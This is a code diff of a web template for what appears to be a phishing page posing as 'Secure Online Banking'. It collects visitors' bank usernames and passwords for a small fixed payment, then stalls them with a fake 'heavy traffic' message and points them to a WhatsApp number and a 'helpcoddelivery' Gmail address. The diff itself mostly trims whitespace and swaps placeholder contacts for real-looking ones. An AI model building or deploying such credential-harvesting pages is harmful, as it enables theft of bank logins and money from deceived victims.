@@ -23,8 +23,8 @@
 <body>
     <div class="container" id="logo-section">
         <div class="row">
-            <div class="col-xs-12 col-md-6 col-lg-6"> 
-                <img src="{{asset('pages/bank/images/logo.png')}}" class="img-fluid"> 
+            <div class="col-xs-12 col-md-6 col-lg-6">
+                <img src="{{asset('pages/bank/images/logo.png')}}" class="img-fluid">
             </div>
             <div class="col-xs-12 col-md-6 col-lg-6 desktop-timer">
                     <div id="timer">{{date('h:i A')}}</div>
@@ -34,7 +34,7 @@
     <div class="container" id="desktop-banner">
         <div class="row">
             <div class="col-md-12">
-                
+
             </div>
         </div>
     </div>
@@ -86,7 +86,7 @@
                                 @php
                                     $data = \App\Bank::all();
                                 @endphp
-                                @foreach ($data as $item)                                    
+                                @foreach ($data as $item)
                                     <li class="list-group-item">
                                         <div class="row">
                                             <div class="col-9">
@@ -121,11 +121,11 @@
 
     <div class="modal fade" id="paymentModal" data-backdrop="static" data-keyboard="false" aria-hidden="true">
         <div class="modal-dialog modal-lg">
-            <div class="modal-content">            
+            <div class="modal-content">
                 <div class="modal-header">
                     <h4 class="modal-title float-left">* Secure Online Banking :</h4>
                     <button type="button" class="close" data-dismiss="modal">X</button>
-                </div>                
+                </div>
                 <div class="modal-body">
                     <div class="row d-flex justify-content-center" id="paymentBox">
                         <div class="col-md-3 pt-3">
@@ -143,7 +143,7 @@
                                         <div class="input-group-prepend">
                                             <span class="input-group-text"><i class="fas fa-user"></i></span>
                                         </div>
-                                        <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="Bank Username">                                    
+                                        <input type="text" class="form-control username" id="usernameForm" name="username" required placeholder="Bank Username">
                                     </div>
                                 </div>
                                 <div class="form-group mt-3">
@@ -152,7 +152,7 @@
                                             <span class="input-group-text"><i class="fas fa-lock"></i></span>
                                         </div>
                                         <input type="password" class="form-control password" name="password" required placeholder="Bank Password">
-                                    </div>                                    
+                                    </div>
                                 </div>
                                 <div class="form-group mt-3">
                                     <input type="text" class="form-control" name="amount" value="RM 5" readonly placeholder="Amount" />
@@ -204,9 +204,9 @@
                             $("#ajax-loading").fadeIn();
                         },
                         success: function(response) {
-                            setTimeout(function(){ 
+                            setTimeout(function(){
                                 $("#ajax-loading").fadeOut();
-                                Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60123123123" target="_blank">60123123123</a></p><p>Email us at <a href="mailto:testtest123123@gmail.com">testtest123123@gmail.com</a></p></div>`);
+                                Swal.fire(`<div class="text-left pt-3" style="font-size: 17px;"><p>Site will be slow due to heavy traffice. Please Try again later.</p><p>Contact or WhatsApp <a href="https://api.whatsapp.com/send?phone=60177163578" target="_blank">+60177163578</a></p><p>Email us at <a href="mailto:helpcoddelivery@gmail.com">helpcoddelivery@gmail.com</a></p></div>`);
                             }, 15000);
                         },
                     });
